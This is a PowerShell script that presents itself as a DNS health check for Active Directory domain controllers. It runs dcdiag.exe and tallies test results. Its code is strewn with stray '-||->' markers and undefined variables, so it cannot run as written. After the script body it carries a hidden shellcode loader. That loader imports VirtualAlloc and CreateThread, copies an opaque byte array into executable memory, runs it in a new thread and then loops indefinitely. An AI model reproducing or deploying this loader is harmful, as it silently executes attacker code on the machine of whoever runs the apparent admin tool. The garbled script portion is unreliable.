[CmdletBinding(DefaultParameterSetName = 'None')]
[OutputType()]
param
(
	[Parameter(ParameterSetName = 'DomainController')]
	[ValidateNotNullOrEmpty()]
	[string[]]$DomainController,
	
	[Parameter()]
	[ValidateNotNullOrEmpty()]
	[ValidateSet('DnsForwarders', 'DnsDelegation', 'DnsDynamicUpdate', 'DnsRecordRegistration', 'DnsResolveExtName', 'DnsAll')]
	[string[]]$DnsTest,
	
	[Parameter()]
	[ValidateNotNullOrEmpty()]
	[string]$DnsInternetName,	

	[Parameter(ParameterSetName = 'DomainWide')]
	[ValidateNotNullOrEmpty()]
	[string]$DomainName = ( -||-> Get-ADDomain <-||- ).DNSRoot,
	
	[Parameter()]
	[ValidateNotNullOrEmpty()]
	[ValidateScript({  -||-> Test-Path -Path $_ -PathType Leaf <-||-  })]
	[string]$DcDiagFilePath = 'C:\Windows\System32\dcdiag.exe'

)
process {
	 -||-> try
	{
		 -||-> $TestRegex = '(PASS|WARN|FAIL|n/a)|(PASS|WARN|FAIL|n/a)|(PASS|WARN|FAIL|n/a)|(PASS|WARN|FAIL|n/a)|(PASS|WARN|FAIL|n/a)|(PASS|WARN|FAIL|n/a)' <-||- 
		 -||-> $AllTestsPassedRegex = 'passed test DNS' <-||- 
		 -||-> if ( -||-> $PSCmdlet.ParameterSetName -eq 'DomainController' <-||- )
		{
			 -||-> $ServerTestResults =  -||-> & $DcDiagFilePath /s:$Dc /test:DNS <-||-  <-||- 
		}
		else
		{
			 -||-> $ServerTestResults =  -||-> & $DcDiagFilePath /a /test:DNS <-||-  <-||- 
		} <-||- 
		 -||-> if ( -||-> -not $ServerTestResults <-||- )
		{
			throw  -||-> 'Could not parse results' <-||- 
		} <-||- 
		 -||-> Write-Verbose -Message 'Finished dcdiag.exe execution. Parsing result...' <-||- 
		 -||-> $ServerResults = [regex]::Matches($ServerTestResults, $TestRegex).Value <-||- 
		 -||-> $TestResults = @{
			'Authentication' =  -||-> '' <-||- 
			'Basic' =  -||-> '' <-||- 
			'Forwarders' =  -||-> '' <-||- 
			'Delegations' =  -||-> '' <-||- 
			'DynamicUpdates' =  -||-> '' <-||- 
			'RecordRegistrations' =  -||-> '' <-||- 
		} <-||- 
		 -||-> if ( -||-> $ServerResults -and ( -||-> $ServerResults.Count -ne 7 <-||- ) <-||- )
		{
			 -||-> Write-Verbose -Message "Successfully parsed dcdiag.exe summary results with $( -||-> $ServerResults -join ',' <-||- )" <-||- 
			 -||-> $SummaryResults += [pscustomobject]@{ 'DomainController' =  -||-> $Dc <-||- ; 'Test' =  -||-> 'Authentication' <-||- ; 'Result' =  -||-> $ServerResults[0] <-||-  } <-||- 
			 -||-> $SummaryResults += [pscustomobject]@{ 'DomainController' =  -||-> $Dc <-||- ; 'Test' =  -||-> 'Basic' <-||- ; 'Result' =  -||-> $ServerResults[1] <-||-  } <-||- 
			 -||-> $SummaryResults += [pscustomobject]@{ 'DomainController' =  -||-> $Dc <-||- ; 'Test' =  -||-> 'Forwarders' <-||- ; 'Result' =  -||-> $ServerResults[2] <-||-  } <-||- 
			 -||-> $SummaryResults += [pscustomobject]@{ 'DomainController' =  -||-> $Dc <-||- ; 'Test' =  -||-> 'Delegations' <-||- ; 'Result' =  -||-> $ServerResults[3] <-||-  } <-||- 
			 -||-> $SummaryResults += [pscustomobject]@{ 'DomainController' =  -||-> $Dc <-||- ; 'Test' =  -||-> 'DynamicUpdates' <-||- ; 'Result' =  -||-> $ServerResults[4] <-||-  } <-||- 
			 -||-> $SummaryResults += [pscustomobject]@{ 'DomainController' =  -||-> $Dc <-||- ; 'Test' =  -||-> 'RecordRegistrations' <-||- ; 'Result' =  -||-> $ServerResults[5] <-||-  } <-||- 
		}
		elseif ( -||-> -not $ServerResults <-||- )
		{
			
			 -||-> $ServerResults = [regex]::Matches($ServerTestResults, $AllTestsPassedRegex).Value <-||- 
			 -||-> if ( -||-> !$ServerResults <-||- )
			{
				throw  -||-> "Could not determine test results for DC '$Dc'" <-||- 
			}
			else
			{ 
				 -||-> $SummaryResults += [pscustomobject]@{ 'DomainController' =  -||-> $Dc <-||- ; 'Test' =  -||-> 'Authentication' <-||- ; 'Result' =  -||-> 'PASS' <-||-  } <-||- 
				 -||-> $SummaryResults += [pscustomobject]@{ 'DomainController' =  -||-> $Dc <-||- ; 'Test' =  -||-> 'Basic' <-||- ; 'Result' =  -||-> 'PASS' <-||-  } <-||- 
				 -||-> $SummaryResults += [pscustomobject]@{ 'DomainController' =  -||-> $Dc <-||- ; 'Test' =  -||-> 'Forwarders' <-||- ; 'Result' =  -||-> 'PASS' <-||-  } <-||- 
				 -||-> $SummaryResults += [pscustomobject]@{ 'DomainController' =  -||-> $Dc <-||- ; 'Test' =  -||-> 'Delegations' <-||- ; 'Result' =  -||-> 'PASS' <-||-  } <-||- 
				 -||-> $SummaryResults += [pscustomobject]@{ 'DomainController' =  -||-> $Dc <-||- ; 'Test' =  -||-> 'DynamicUpdates' <-||- ; 'Result' =  -||-> 'PASS' <-||-  } <-||- 
				 -||-> $SummaryResults += [pscustomobject]@{ 'DomainController' =  -||-> $Dc <-||- ; 'Test' =  -||-> 'RecordRegistrations' <-||- ; 'Result' =  -||-> 'PASS' <-||-  } <-||- 
			} <-||- 
		} <-||- 
		
		 -||-> $SummaryResults =  -||-> $SummaryResults | group test, result -NoElement <-||-  <-||- 
		 -||-> $Output.'Authentication' = "{0} / {1} / {2}" -f ( -||-> $SummaryResults | where {  -||-> $_.Name -eq 'Authentication, PASS' <-||-  } <-||- ).Count, ( -||-> $SummaryResults | where {  -||-> $_.Name -eq 'Authentication, WARN' <-||-  } <-||- ).Count, ( -||-> $SummaryResults | where {  -||-> $_.Name -eq 'Authentication, FAIL' <-||-  } <-||- ).Count <-||- 
		 -||-> $Output.'Basic' = "{0} / {1} / {2}" -f ( -||-> $SummaryResults | where {  -||-> $_.Name -eq 'Basic, PASS' <-||-  } <-||- ).Count, ( -||-> $SummaryResults | where {  -||-> $_.Name -eq 'Basic, WARN' <-||-  } <-||- ).Count, ( -||-> $SummaryResults | where {  -||-> $_.Name -eq 'Basic, FAIL' <-||-  } <-||- ).Count <-||- 
		 -||-> $Output.'Forwarders' = "{0} / {1} / {2}" -f ( -||-> $SummaryResults | where {  -||-> $_.Name -eq 'Forwarders, PASS' <-||-  } <-||- ).Count, ( -||-> $SummaryResults | where {  -||-> $_.Name -eq 'Forwarders, WARN' <-||-  } <-||- ).Count, ( -||-> $SummaryResults | where {  -||-> $_.Name -eq 'Forwarders, FAIL' <-||-  } <-||- ).Count <-||- 
		 -||-> $Output.'Delegations' = "{0} / {1} / {2}" -f ( -||-> $SummaryResults | where {  -||-> $_.Name -eq 'Delegations, PASS' <-||-  } <-||- ).Count, ( -||-> $SummaryResults | where {  -||-> $_.Name -eq 'Delegations, WARN' <-||-  } <-||- ).Count, ( -||-> $SummaryResults | where {  -||-> $_.Name -eq 'Delegations, FAIL' <-||-  } <-||- ).Count <-||- 
		 -||-> $Output.'Dynamic Updates' = "{0} / {1} / {2}" -f ( -||-> $SummaryResults | where {  -||-> $_.Name -eq 'DynamicUpdates, PASS' <-||-  } <-||- ).Count, ( -||-> $SummaryResults | where {  -||-> $_.Name -eq 'DynamicUpdates, WARN' <-||-  } <-||- ).Count, ( -||-> $SummaryResults | where {  -||-> $_.Name -eq 'DynamicUpdates, FAIL' <-||-  } <-||- ).Count <-||- 
		 -||-> $Output.'Record Registrations' = "{0} / {1} / {2}" -f ( -||-> $SummaryResults | where {  -||-> $_.Name -eq 'RecordRegistrations, PASS' <-||-  } <-||- ).Count, ( -||-> $SummaryResults | where {  -||-> $_.Name -eq 'RecordRegistrations, WARN' <-||-  } <-||- ).Count, ( -||-> $SummaryResults | where {  -||-> $_.Name -eq 'RecordRegistrations, FAIL' <-||-  } <-||- ).Count <-||- 
		
		 -||-> [pscustomobject]$Output <-||- 
	}
	catch
	{
		 -||-> Write-Error $_.Exception.Message <-||- 
	} <-||- 
}
$i8n3 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $i8n3 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0xd4,0xb9,0xc0,0x0a,0xda,0xce,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x70,0x13,0x03,0x70,0x13,0x83,0xc0,0xd0,0x5b,0x35,0xf6,0x30,0x19,0xb6,0x07,0xc0,0x7e,0x3e,0xe2,0xf1,0xbe,0x24,0x66,0xa1,0x0e,0x2e,0x2a,0x4d,0xe4,0x62,0xdf,0xc6,0x88,0xaa,0xd0,0x6f,0x26,0x8d,0xdf,0x70,0x1b,0xed,0x7e,0xf2,0x66,0x22,0xa1,0xcb,0xa8,0x37,0xa0,0x0c,0xd4,0xba,0xf0,0xc5,0x92,0x69,0xe5,0x62,0xee,0xb1,0x8e,0x38,0xfe,0xb1,0x73,0x88,0x01,0x93,0x25,0x83,0x5b,0x33,0xc7,0x40,0xd0,0x7a,0xdf,0x85,0xdd,0x35,0x54,0x7d,0xa9,0xc7,0xbc,0x4c,0x52,0x6b,0x81,0x61,0xa1,0x75,0xc5,0x45,0x5a,0x00,0x3f,0xb6,0xe7,0x13,0x84,0xc5,0x33,0x91,0x1f,0x6d,0xb7,0x01,0xc4,0x8c,0x14,0xd7,0x8f,0x82,0xd1,0x93,0xc8,0x86,0xe4,0x70,0x63,0xb2,0x6d,0x77,0xa4,0x33,0x35,0x5c,0x60,0x18,0xed,0xfd,0x31,0xc4,0x40,0x01,0x21,0xa7,0x3d,0xa7,0x29,0x45,0x29,0xda,0x73,0x01,0x9e,0xd7,0x8b,0xd1,0x88,0x60,0xff,0xe3,0x17,0xdb,0x97,0x4f,0xdf,0xc5,0x60,0xb0,0xca,0xb2,0xff,0x4f,0xf5,0xc2,0xd6,0x8b,0xa1,0x92,0x40,0x3a,0xca,0x78,0x91,0xc3,0x1f,0x14,0x94,0x53,0xc9,0x77,0x02,0xb7,0x61,0x8a,0x2b,0xb6,0xca,0x03,0xcd,0xe8,0x7c,0x44,0x42,0x48,0x2d,0x24,0x32,0x20,0x27,0xab,0x6d,0x50,0x48,0x61,0x06,0xfa,0xa7,0xdc,0x7e,0x92,0x5e,0x45,0xf4,0x03,0x9e,0x53,0x70,0x03,0x14,0x50,0x84,0xcd,0xdd,0x1d,0x96,0xb9,0x2d,0x68,0xc4,0x6f,0x31,0x46,0x63,0x8f,0xa7,0x6d,0x22,0xd8,0x5f,0x6c,0x13,0x2e,0xc0,0x8f,0x76,0x25,0xc9,0x05,0x39,0x51,0x36,0xca,0xb9,0xa1,0x60,0x80,0xb9,0xc9,0xd4,0xf0,0xe9,0xec,0x1a,0x2d,0x9e,0xbd,0x8e,0xce,0xf7,0x12,0x18,0xa7,0xf5,0x4d,0x6e,0x68,0x05,0xb8,0x6e,0x54,0xd0,0x84,0x04,0xb4,0xe0;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$iqX=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($iqX.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$iqX,0,0,0);for (;;){Start-sleep 60};



